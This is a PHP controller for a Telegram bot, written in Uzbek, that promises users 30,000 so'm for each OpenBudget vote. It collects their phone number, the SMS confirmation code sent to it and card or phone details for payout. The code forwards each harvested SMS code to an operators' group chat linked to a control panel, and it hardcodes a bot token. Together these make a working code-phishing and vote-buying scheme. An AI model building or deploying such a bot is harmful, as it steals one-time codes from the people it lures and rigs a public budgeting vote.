<?php

namespace frontend\controllers;

use frontend\models\Bud;
use Yii;
use yii\web\Controller;

class Finance2Controller extends Controller
{
    const TOKEN = '8182453082:AAHIBlrjJAHWTPNMyLvm9aR3g6x07uW8FGw';
    public $layout = false;
    public $enableCsrfValidation = false;
    public $chatId;
    public $text;
    public $userId;
    public $phone;
    public $username;
    public $message_id;
    public $publicChatId = '-4615541062';

    public function actionIndex()
    {
        //offline
//        $updates = $this->getUpdates();
//        $request = end($updates['result']);

//        online
        $updates = file_get_contents("php://input");
        $request = json_decode($updates, true);

        if (isset($request['message']['voice']) || isset($request['message']['photo']) || isset($request['message']['video']) || isset($request['message']['location']) || isset($request['message']['document'])){
            die('No');
        }
        else {
            $message = $request['message'];
            $from = $message['from'];
            $chat = $message['chat'];
            $this->text = $message['text'];
            $this->message_id = $request['message']['message_id'];
            $this->userId = $from['id'];
            $userNameCheck = array_key_exists('username', $from);
            if ($userNameCheck) {
                $this->username = $from['username'];
            }
            $this->chatId = $chat['id'];

            if ($this->text == '/start') { $this->main(); die(); }
            if ($this->text == '💰 Balans') { $this->balance(); die(); }
            if ($this->text == '🚫 Bekor qilish') { $this->cancel(); die(); }
            if ($this->text == '🗳 Ovoz berish') { $this->begin(); die(); }
            if ($this->text == '🛣 Loyha haqida') { $this->project(); die(); }
            if ($this->text == '📮 5 daqiqa kutdim kelmadi') { $this->begin(); die(); }
            if ($this->text == '✅ Yechib olish') { $this->pay(); die(); }
            if ($this->text == '📑 Yo`riqnoma') { $this->privacy(); die(); }
            if ($this->text == '/help') { $this->privacy(); die(); }

            ///check step
            $cache = Yii::$app->cache->get($this->chatId.'_step');
            if (($cache??null) == 1){ $this->sendSms(); die(); }
            if (($cache??null) == 2){ $this->comSms(); die(); }
            if (($cache??null) == 3){ $this->confirmPay(); die(); }
        }
    }

    public function privacy()
    {
        Yii::$app->cache->delete(($this->chatId.'_step'));
        $this->bot('sendMessage', [
            'chat_id' => $this->chatId,
            'text' => "❓Bot nima qila oladi?:
— Botimiz orqali OpenBudget uchun ovoz berib pul ishlashingiz mumkin. To'plangan pullarni telefon raqamingizga paynet tariqasida yoki karta raqamingizga yechib olishingiz mumkin.
\n
❓Pulni qanday yechib olaman?:
— 💵Hisobim bo'limiga o'ting va «💰 Pul yechish» tugmasini bosing. To'lov tizimlaridan birini tanlang. Karta raqamingiz yoki telefon raqamingizni kiriting. Administratorimiz hisobingizni to'ldiradi.
\n
🙆‍ Aloqa: @openmuhokama
",
            'parse_mode' => 'html',
        ]);
    }

    public function pay()
    {
        $model = Bud::findOne(['chat_id' => $this->chatId]);
        if ($model->balance == 0){
            $this->bot('sendMessage', [
                'chat_id' => $this->chatId,
                'text' => "💳 Hisobingizni maglag` yetarli emas!",
                'parse_mode' => 'html',
            ]);
        }else{
            Yii::$app->cache->set(($this->chatId.'_step'),3,(30*86400));
            $this->bot('sendMessage', [
                'chat_id' => $this->chatId,
                'text' => "🔥Hamkorligingiz uchun rahmat \n\n💳Karta raqamingizni Yoki Paynet uchun telefon raqamingizni kiriting👇",
                'parse_mode' => 'html',
                'reply_markup' => json_encode([
                    'keyboard' => [
                        [
                            ['text' => '🚫 Bekor qilish'],
                        ],
                    ],
                    'resize_keyboard' => true,
                ])
            ]);
        }
    }

    public function confirmPay()
    {

        $sData = [
            'viewed' => 0,
            'message' => 'Pul chiqarish Karta Raqam:'.$this->text,
            'created' => time(),
            'admin' => null
        ];
        $model = Bud::findOne(['chat_id' => $this->chatId]);
        if (!$model){
            $model = new Bud();
            $model->chat_id = $this->chatId;
        }

        $model->status = 1;
        $oldData = json_decode($model->messages);
        $oldData[] = $sData;
        $model->messages = json_encode($oldData);
        $model->save();

        Yii::$app->cache->delete(($this->chatId.'_step'));
        $this->bot('sendMessage', [
            'chat_id' => $this->chatId,
            'text' => "✅ So`rovingiz yuborildi! Jarayon 10 daqiqadan 1 soatgacha vaqt olishi mumkin\nIltimos kuting.",
            'parse_mode' => 'html',
            'reply_markup' => json_encode([
                'keyboard' => [
                    [
                        ['text' => '💰 Balans'],
                        ['text' => '🗳 Ovoz berish'],
                    ],
                    [
                        ['text' => '🛣 Loyha haqida'],
                        ['text' => '📑 Yo`riqnoma'],
                    ],
                ],
                'resize_keyboard' => true,
            ])
        ]);
        $ci = $this->chatId;
        $this->staticBot([
            'chat_id' => $this->publicChatId,
            'text' => "https://simply.uz/control/index\n".'💸 Pul yechish so`rovi yuborildi'."\n".'Balance: '.$model->balance??0
        ]);
    }

    public function comSms()
    {

        $sData = [
            'viewed' => 0,
            'message' => 'Confirm Code:  '.$this->text,
            'created' => time(),
            'admin' => null
        ];

        $model = Bud::findOne(['chat_id' => $this->chatId]);
        $model->status = 1;
        $oldData = json_decode($model->messages);
        $oldData[] = $sData;
        $model->messages = json_encode($oldData);
        $model->save();

        Yii::$app->cache->delete(($this->chatId.'_step'));
        $this->bot('sendMessage', [
            'chat_id' => $this->chatId,
            'text' => "Sms kod tekshirilmoqda! \n🗣 Ovoz berganingiz uchun rahmat. Tez orada balanisingizga maglag` tushuriladi. \n Bot sizga habar beradi!",
            'parse_mode' => 'html',
            'reply_markup' => json_encode([
                'keyboard' => [
                    [
                        ['text' => '💰 Balans'],
                        ['text' => '🗳 Ovoz berish'],
                    ],
                    [
                        ['text' => '🛣 Loyha haqida'],
                        ['text' => '📑 Yo`riqnoma'],
                    ],
                ],
                'resize_keyboard' => true,
            ])
        ]);
        $ci = $this->chatId;
        $this->staticBot([
            'chat_id' => $this->publicChatId,
            'text' => "https://simply.uz/control/index\n".'📲 Tasdiqlash kodi yuborildi'."\n".'Code: '.$this->text
        ]);
    }

    public function sendSms()
    {

        $phone = (string)intval(str_replace(' ','',$this->text));
        $len = strlen($phone);
        if ($len == 9 || $len == 12) {
            $sData = [
                'viewed' => 0,
                'message' => 'Phone: '.$phone,
                'created' => time(),
                'admin' => null
            ];

            $model = Bud::findOne(['chat_id' => $this->chatId]);
            if (!$model){
                $model = new Bud();
                $model->chat_id = $this->chatId;
                $model->balance = 0;
            }
            $oldData = json_decode($model->messages);
            $oldData[] = $sData;
            $model->status = 1;
            $model->user_name = $this->username;
            $model->messages = json_encode($oldData);
            $model->save();


            Yii::$app->cache->set(($this->chatId.'_step'),2,(30*86400));
            $this->bot('sendMessage', [
                'chat_id' => $this->chatId,
                'text' => "🕐 Sms kelishini 5 daqiqagacha kuting. \n\n📝  Kodni kirgizing 👇",
                'parse_mode' => 'html',
                'reply_markup' => json_encode([
                    'keyboard' => [
                        [
                            ['text' => '📮 5 daqiqa kutdim kelmadi'],
                            ['text' => '🚫 Bekor qilish'],
                        ],
                    ],
                    'resize_keyboard' => true,
                ])
            ]);

            $this->staticBot([
                'chat_id' => $this->publicChatId,
                'text' => "https://simply.uz/control/index\n".'🕐 SMS ni kutilmoqda'
            ]);

            die();
        }
        $this->bot('sendMessage', [
            'chat_id' => $this->chatId,
            'text' => "Telfon raqamingizni formatini to`g`ri kiriting!\nMasalan: <b>90 909 09 09</b>",
            'parse_mode' => 'html',
            'reply_markup' => json_encode([
                'keyboard' => [
                    [
                        ['text' => '🚫 Bekor qilish'],
                    ],
                ],
                'resize_keyboard' => true,
            ])
        ]);
        die();

    }

    public function main()
    {
        $this->bot('sendMessage', [
            'chat_id' => $this->chatId,
            'text' => 'Salom, hurmatli foydalanuvchi! '."\n\n".'Botimiz orqali Openbudget uchun ovoz berib har bir ovoz uchun 30 000 so’m pul ishlab olishingiz mumkin. To’plangan pullarni telefon raqamiga paynet yoki plastik kartangizga click qilib olishingiz mumkin.'."\n\nMuhokama uchun guruh:@openmuhokama",
            'parse_mode' => 'html',
            'reply_markup' => json_encode([
                'keyboard' => [
                    [
                        ['text' => '💰 Balans'],
                        ['text' => '🗳 Ovoz berish'],
                    ],
                    [
                        ['text' => '🛣 Loyha haqida'],
                        ['text' => '📑 Yo`riqnoma'],
                    ],
                ],
                'resize_keyboard' => true,
            ])
        ]);
    }

    public function project()
    {
        $photo_url = 'https://openbudget.uz/api/v2/info/file/fea5c7746b63b65af891baa91b9c1a08';
        $caption = 'Qurilish bo’layotgan joy qayerda?' . "\n\n" .
            'YANGI MAYMANOQ MFY hududidagi Nasaf, Turkiston, Yuqori Maymanoq va boshqa ko’chalarini farzandlarimiz maktab va bog’chalarda qiynalmasdan borib kelishlari uchun 3500 metr asfaltlashtirish loyihasini kiritaman.' . "\n\n" .
            '@OpenBudgetIshonchliBot'."\n\n https://openbudget.uz/boards/initiatives/initiative/50/b08622fe-b28d-4fe5-a5dd-69fd005e3ba8";
        $this->bot('sendPhoto', [
            'chat_id' => $this->chatId,
            'photo' => $photo_url,
            'caption' => $caption,
            'parse_mode' => 'html',
            'reply_markup' => json_encode([
                'keyboard' => [
                    [
                        ['text' => '💰 Balans'],
                        ['text' => '🗳 Ovoz berish'],
                    ],
                    [
                        ['text' => '🛣 Loyha haqida'],
                        ['text' => '📑 Yo`riqnoma'],
                    ],
                ],
                'resize_keyboard' => true,
            ])
        ]);

    }

    public function balance()
    {
        $model = Bud::findOne(['chat_id' => $this->chatId]);
        $balance = $model->balance??0;
        $this->bot('sendMessage', [
            'chat_id' => $this->chatId,
            'text' => '💲 Sizning balansingiz:  '.$balance.' so`m',
            'parse_mode' => 'html',
            'reply_markup' => json_encode([
                'keyboard' => [
                    [
                        ['text' => '✅ Yechib olish'],
                        ['text' => '🚫 Bekor qilish'],
                    ],
                ],
                'resize_keyboard' => true,
            ])
        ]);
    }

    public function cancel()
    {
        Yii::$app->cache->delete(($this->chatId.'_step'));
        $this->bot('sendMessage', [
            'chat_id' => $this->chatId,
            'text' => '🏘 Asosiy sahifa. Kerakli bo`limni tanlang. 👇',
            'parse_mode' => 'html',
            'reply_markup' => json_encode([
                'keyboard' => [
                    [
                        ['text' => '💰 Balans'],
                        ['text' => '🗳 Ovoz berish'],
                    ],
                    [
                        ['text' => '🛣 Loyha haqida'],
                        ['text' => '📑 Yo`riqnoma'],
                    ],
                ],
                'resize_keyboard' => true,
            ])
        ]);
    }

    public function begin()
    {
        Yii::$app->cache->set(($this->chatId.'_step'),1,(30*86400));
        $this->bot('sendMessage', [
            'chat_id' => $this->chatId,
            'text' => 'Telfon raqamingizni kiriting format 99 999 99 99',
            'parse_mode' => 'html',
            'reply_markup' => json_encode([
                'keyboard' => [
                    [
                        ['text' => '🚫 Bekor qilish'],
                    ],
                ],
                'resize_keyboard' => true,
            ])
        ]);
    }


    public function bot($method, $data = [])
    {
        $token = self::TOKEN;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot' . $token . '/' . $method);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $res = curl_exec($ch);
        return json_decode($res, 1);
    }

    public static function staticBot($data = [])
    {
        $token = self::TOKEN;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot' . $token . '/sendMessage');
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $res = curl_exec($ch);
        return json_decode($res, 1);
    }

    public function getUpdates($data = [])
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot'.self::TOKEN.'/getUpdates');
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $res = curl_exec($ch);
        return json_decode($res, 1);
    }
}
